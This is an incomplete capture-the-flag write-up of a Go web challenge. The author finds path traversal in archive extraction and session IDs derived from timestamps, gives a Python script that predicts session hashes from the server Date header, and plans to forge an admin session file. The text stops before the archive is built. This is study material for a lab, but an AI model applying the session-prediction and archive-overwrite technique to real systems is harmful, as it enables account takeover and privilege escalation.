download files for challenge, open and try to read
i find two interesting files it's: 
`http.go` and `sessions.go`
in first we have struct for user 
```GO
type User struct {
	Username string `json:"username"`
	ID       int    `json:"id"`
	Role     string `json:"role"`
}
...
sessionID := fmt.Sprintf("%x", sha256.Sum256([]byte(strconv.FormatInt(time.Now().Unix(), 10))))
```
and how application make a sessionID, in the second file we find 
```GO
func CreateSession(sessionID string, user *User) string {

	sessionJSON, _ := json.Marshal(user)

	// Check if sessions folder exists, create it if it doesn't
	folderPath := filepath.Join("/tmp/sessions/", user.Username)
	if _, err := os.Stat(folderPath); os.IsNotExist(err) {
		if err := os.MkdirAll(folderPath, 0755); err != nil {
			log.Fatal(err)
		}
	}

	// Write session file
	sessionFilePath := filepath.Join(folderPath, sessionID)
	err := os.WriteFile(sessionFilePath, sessionJSON, 0644)
	if err != nil {
		log.Fatal(err)
	}

	return sessionID
}
```
how named a path to user struct, now registrate on the website, after registration we can upload archives on website, try to do it
![[Pasted image 20251121170945.png]]on the second try we ha venext![[Pasted image 20251121171035.png]]
we download one archive and have another results from server, i cant find another endpoint but i can find `UploadEnigma` - function that is upload and extract file, i dont know `Go` but i can read and take a main idea of this function, for more detailed analysis i asked GPT 
```GO
func UploadEnigma(c *fiber.Ctx) error {

	user := c.Locals("user")
	if user == nil {
		return utils.ErrorResponse(c, "User not found", http.StatusForbidden)
	}

	userStruct, ok := user.(User)
	if !ok {
		return c.SendStatus(http.StatusInternalServerError)
	}

	file, err := c.FormFile("archive")
	if err != nil {
		return err
	}

	filename := uuid.New().String() + filepath.Ext(file.Filename)

	tempFile := filepath.Join("./uploads", filename)
	if err := c.SaveFile(file, filepath.Join("./uploads", filename)); err != nil {
		return utils.ErrorResponse(c, "Error saving file", http.StatusInternalServerError)
	}

	userFolder := filepath.Join("./files", userStruct.Username)
	if _, err := os.Stat(userFolder); os.IsNotExist(err) {
		if err := os.MkdirAll(userFolder, 0755); err != nil {
			log.Fatal(err)
		}
	}

	err = archiver.Unarchive(tempFile, userFolder)

	if err != nil {
		return err
	}

	return utils.MessageResponse(c, "Archive uploaded and extracted successfully", http.StatusAccepted)
}
```
first its make a copy of archive in temporary dir like `./uploads/UUID.zip`/make a path for users folder 
```go 
userFolder := filepath.Join("./files", userStruct.Username)
```
and path will be: `./files/{username}/name_of_file`
and unarchive 
```Go
err = archiver.Unarchive(tempFile, userFolder)
```
`archiver.Unarchive` cant filtrate place thats will be unpacket archive, we can make a fake link like
`/tmp/sessions/username/sessionsID`, just use link in tar o zip file, my main idea its make a file with struct
```Java
{
	"username": "test"
	"id": 1234
	"role": admin
}
```
and archivate with `link/User/sessionID` and maybe it will be work, first vulnerability what we have its `ZipFlip` we can archive our file in every dir if make a correct archive, second vulneability its so weak function of make sessionID, just use the time for unic sessionID no so safely because in response of server we have a time and we can make this 'unic' sessionID, now tryu to do it, registr new user and try to log in with incorrect password caido, because we need to take a time from server 
```HTTP
HTTP/1.1 400 Bad Request  
Date: Fri, 21 Nov 2025 10:39:25 GMT
Content-Type: application/json
Content-Length: 40/
```
server make our sessionID and now we can make a hash of our session, use python 
```python
from datetime import datetime,timezone 
import hashlib

date = "Fri, 21 Nov 2025 10:39:25 GMT"
dt=datetime.strptime(date, "%a, %d %b %Y %H:%M:%S %Z")
dt = dt.replace(tzinfo=timezone.utc)
time=int(dt.timestamp())

for i in [-1, 0, 1]:
	t= time+i
	sessionid= hashlib.sha256(str(t).encode()).hexdigest()
	print(f"{t}=> {sessionid}")
```
result:
```shell
1763721564=> 2cad9970f56e45c2f5cf9864009b8e2b7216ee80c8e04d79575886ce2eb16c13
1763721565=> f774d0d5e0c22c9189d733e4eeb22481af0184fec76e05685109508e5baf654c
1763721566=> 461fdea971ecae95f28ede4e111014d572c6aee4de3f818f502647353d0877f8
```
now make a archive with ways 